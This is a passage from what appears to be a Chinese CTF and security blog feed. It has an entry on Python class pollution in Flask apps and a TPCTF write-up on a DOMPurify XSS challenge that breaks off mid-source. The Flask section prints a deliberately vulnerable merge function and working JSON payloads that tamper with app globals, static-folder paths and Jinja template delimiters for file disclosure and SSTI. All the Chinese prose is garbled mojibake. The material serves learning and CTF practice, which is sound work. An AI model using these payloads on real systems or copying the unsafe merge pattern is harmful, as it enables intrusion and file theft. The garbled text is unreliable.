title="_got_first_requestæ±¡æŸ“"></a>_got_first_requestæ±¡æŸ“</h4><p>ç”¨äºåˆ¤å®šæ˜¯å¦æŸæ¬¡è¯·æ±‚ä¸ºè‡ª<code>Flask</code>å¯åŠ¨åç¬¬ä¸€æ¬¡è¯·æ±‚ï¼Œæ˜¯<code>Flask.got_first_request</code>å‡½æ•°çš„è¿”å›å€¼ï¼Œæ­¤å¤–è¿˜ä¼šå½±å“è£…é¥°å™¨<code>app.before_first_request</code>çš„è°ƒç”¨ï¼Œè€Œ<code>_got_first_request</code>å€¼ä¸ºå‡æ—¶æ‰ä¼šè°ƒç”¨ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request<br><span class="hljs-keyword">import</span> json<br><br>app = Flask(__name__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-comment"># Recursive merge function</span><br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">cls</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br>instance = cls()<br><br>flag = <span class="hljs-string">&quot;Is flag here?&quot;</span><br><br><span class="hljs-meta">@app.before_first_request</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init</span>():<br>    <span class="hljs-keyword">global</span> flag<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(app, <span class="hljs-string">&quot;special&quot;</span>) <span class="hljs-keyword">and</span> app.special == <span class="hljs-string">&quot;U_Polluted_It&quot;</span>:<br>        flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;rt&quot;</span>).read()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> request.data:<br>        merge(json.loads(request.data), instance)<br>    <span class="hljs-keyword">global</span> flag<br>    <span class="hljs-built_in">setattr</span>(app, <span class="hljs-string">&quot;special&quot;</span>, <span class="hljs-string">&quot;U_Polluted_It&quot;</span>)<br>    <span class="hljs-keyword">return</span> flag<br><br>app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>)<br></code></pre></td></tr></table></figure><p>é“¾å­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=&#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;app&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;_got_first_request&quot;</span>:<span class="hljs-literal">False</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="static-url-pathæ±¡æŸ“"><a href="#static-url-pathæ±¡æŸ“" class="headerlink" title="_static_url_pathæ±¡æŸ“"></a>_static_url_pathæ±¡æŸ“</h4><p>è¿™ä¸ªå±æ€§ç”¨äºå®šä¹‰é™æ€æ–‡ä»¶çš„ç›®å½•ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒFlask ä¼šä» <code>static</code> æ–‡ä»¶å¤¹ä¸­æä¾›é™æ€æ–‡ä»¶ã€‚æ‰€ä»¥æˆ‘ä»¬åªè¦æ±¡æŸ“è¿™ä¸ªå±æ€§å°±å¯ä»¥è¿›è¡Œç›®å½•ç©¿è¶Š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> request.data:<br>        merge(json.loads(request.data), instance)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;flag in ./flag but heres only static/index.html&quot;</span><br>payload=&#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;app&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;_static_folder&quot;</span>:<span class="hljs-string">&quot;./&quot;</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="os-path-pardir"><a href="#os-path-pardir" class="headerlink" title="os.path.pardir"></a>os.path.pardir</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#app.py</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request<br><span class="hljs-keyword">import</span> json<br><br>app = Flask(__name__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-comment"># Recursive merge function</span><br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">cls</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br>instance = cls()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> request.data:<br>        merge(json.loads(request.data), instance)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;flag in ./flag but heres only static/index.html&quot;</span><br><br>app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>)<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯åˆ©ç”¨ç‰¹æ€§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=&#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;os&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;path&quot;</span>:&#123;<br>                    <span class="hljs-string">&quot;pardir&quot;</span>:<span class="hljs-string">&quot;,&quot;</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="SSTI-jinja2æ±¡æŸ“"><a href="#SSTI-jinja2æ±¡æŸ“" class="headerlink" title="SSTI jinja2æ±¡æŸ“"></a>SSTI jinja2æ±¡æŸ“</h4><p>è¿™é‡Œå°±åªè´´å‡ºæ¶æ„é“¾ï¼Œä¸å…·ä½“åˆ†æäº†ï¼Œå…¶å®å°±æ˜¯èµ°çš„sstiçš„åº•å±‚ï¼Œå»æ”¹æ‰æ¨¡æ¿çš„æ ‡è¯†ç¬¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;app&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;jinja_env&quot;</span>:&#123;<br>                    <span class="hljs-string">&quot;variable_start_string&quot;</span>:<span class="hljs-string">&quot;[[&quot;</span>,<br>                    <span class="hljs-string">&quot;variable_end_string&quot;</span>:<span class="hljs-string">&quot;]]&quot;</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="å±æ€§æ±¡æŸ“ä»¥åŠå¯»æ‰¾-pydash"><a href="#å±æ€§æ±¡æŸ“ä»¥åŠå¯»æ‰¾-pydash" class="headerlink" title="å±æ€§æ±¡æŸ“ä»¥åŠå¯»æ‰¾(pydash)"></a>å±æ€§æ±¡æŸ“ä»¥åŠå¯»æ‰¾(pydash)</h2><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p>æ„Ÿè°¢pç¥ï¼Œbaozengwiå¸ˆå‚…</p>]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>åŸå‹é“¾æ±¡æŸ“</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TPCTFå¤ç°</title>
    <link href="/2025/03/09/TPCTF%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/03/09/TPCTF%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>webå°ç™½æ–—èƒ†æŒ‘æˆ˜å›½å†…ctfå¤©èŠ±æ¿ï¼Œæ‹¼å°½å…¨åŠ›æ— æ³•æˆ˜èƒœ ğŸ˜­ğŸ˜­ğŸ˜­</p><p>ä½†è¿˜æ˜¯åˆ†äº«ä¸‹æ€è·¯å§</p><p>tips:å¯ä»¥ä½¿ç”¨<a href="https://yeswehack.github.io/Dom-Explorer/">Dom-Explorer</a>æŸ¥çœ‹ DOMPurify è¾“å‡º</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="bady-logout"><a href="#bady-logout" class="headerlink" title="bady_logout"></a>bady_logout</h2><p>xssæ€ä¹ˆè¿˜è¦ç»•<code>dompurify</code>ç‰ˆæœ¬æ˜¯ä¸æ˜¯å¤ªé«˜äº†ğŸ˜ï¼Œæ€è·¯é”™äº†ï¼Œä»–é‡‡ç”¨æ‹¼æ¥çš„æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥æ‹¼æ¥xss</p><p>æºç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> express <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;express&#x27;</span>;<br><span class="hljs-keyword">import</span> session <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;express-session&#x27;</span>;<br><span class="hljs-keyword">import</span> rateLimit <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;express-rate-limit&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; randomBytes &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;crypto&#x27;</span>;<br><span class="hljs-keyword">import</span> createDOMPurify <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;dompurify&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; <span class="hljs-variable constant_">JSDOM</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;jsdom&#x27;</span>;<br><br><span class="hljs-keyword">const</span> &#123; <span class="hljs-variable language_">window</span> &#125; = <span class="hljs-keyword">new</span> <span class="hljs-title function_">JSDOM</span>();<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">DOMPurify</span> = <span class="hljs-title function_">createDOMPurify</span>(<span class="hljs-variable language_">window</span>);<br><br><span class="hljs-keyword">const</span> posts = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DEFAULT_LAYOUT</span> = <span class="hljs-string">`</span><br><span class="hljs-string">&lt;article&gt;</span><br><span class="hljs-string">  &lt;h1&gt;Blog Post&lt;/h1&gt;</span><br><span class="hljs-string">  &lt;div&gt;&#123;&#123;content&#125;&#125;&lt;/div&gt;</span><br><span class="hljs-string">&lt;/article&gt;</span><br><span class="hljs-string">`</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">LENGTH_LIMIT</span> = <span class="hljs-number">500</span>;<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">&#x27;production&#x27;</span>) &#123;<br>  app.<span class="hljs-title function_">use</span>(<br>    <span class="hljs-string">&#x27;/api&#x27;</span>,<br>    <span class="hljs-title function_">rateLimit</span>(&#123;<br>      <span class="hljs-attr">windowMs</span>: <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>,<br>      <span class="hljs-attr">max</span>: <span class="hljs-number">10</span>,<br>    &#125;),<br>  );<br>&#125;<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">session</span>(&#123;<br>  <span class="hljs-attr">secret</span>: <span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">32</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>),<br>  <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,<br>  <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">false</span>,<br>&#125;));<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, _, next</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>) &#123;<br>    req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span> = [<span class="hljs-variable constant_">DEFAULT_LAYOUT</span>];<br>    req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span> = [];<br>  &#125;<br>  <span class="hljs-title function_">next</span>();<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;Cache-Control&#x27;</span>, <span class="hljs-string">&#x27;no-store&#x27;</span>);<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;home&#x27;</span>, &#123;<br>    <span class="hljs-attr">posts</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span>,<br>    <span class="hljs-attr">maxLayout</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>,<br>  &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/post&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; content, layoutId &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> content !== <span class="hljs-string">&#x27;string&#x27;</span> || <span class="hljs-keyword">typeof</span> layoutId !== <span class="hljs-string">&#x27;number&#x27;</span>) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid params&#x27;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (content.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Content too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> layout = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>[layoutId];<br>  <span class="hljs-keyword">if</span> (layout === <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout not found&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedContent = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(content);<br>  <span class="hljs-keyword">const</span> body = layout.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\&#123;\&#123;content&#125;&#125;/g</span>, <span class="hljs-function">() =&gt;</span> sanitizedContent);<br><br>  <span class="hljs-keyword">if</span> (body.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Post too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> id = <span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>  posts.<span class="hljs-title function_">set</span>(id, body);<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span>.<span class="hljs-title function_">push</span>(id);<br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Post <span class="hljs-subst">$&#123;id&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(layout).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(sanitizedContent).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span>`</span>);<br><br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/layout&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; layout &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> layout !== <span class="hljs-string">&#x27;string&#x27;</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid param&#x27;</span>);<br>  <span class="hljs-keyword">if</span> (layout.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout too large&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedLayout = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(layout);<br><br>  <span class="hljs-keyword">const</span> id = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-property">length</span>;<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-title function_">push</span>(sanitizedLayout);<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/post/:id&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; id &#125; = req.<span class="hljs-property">params</span>;<br>  <span class="hljs-keyword">const</span> body = posts.<span class="hljs-title function_">get</span>(id);<br>  <span class="hljs-keyword">if</span> (body === <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Post not found&#x27;</span>);<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;post&#x27;</span>, &#123; id, body &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/clear&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span> = [<span class="hljs-variable constant_">DEFAULT_LAYOUT</span>];<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span> = [];<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;cleared&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Web server running on port 3000&#x27;</span>);<br>&#125;);<br><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸»è¦çœ‹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/post&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; content, layoutId &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> content !== <span class="hljs-string">&#x27;string&#x27;</span> || <span class="hljs-keyword">typeof</span> layoutId !== <span class="hljs-string">&#x27;number&#x27;</span>) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid params&#x27;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (content.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span 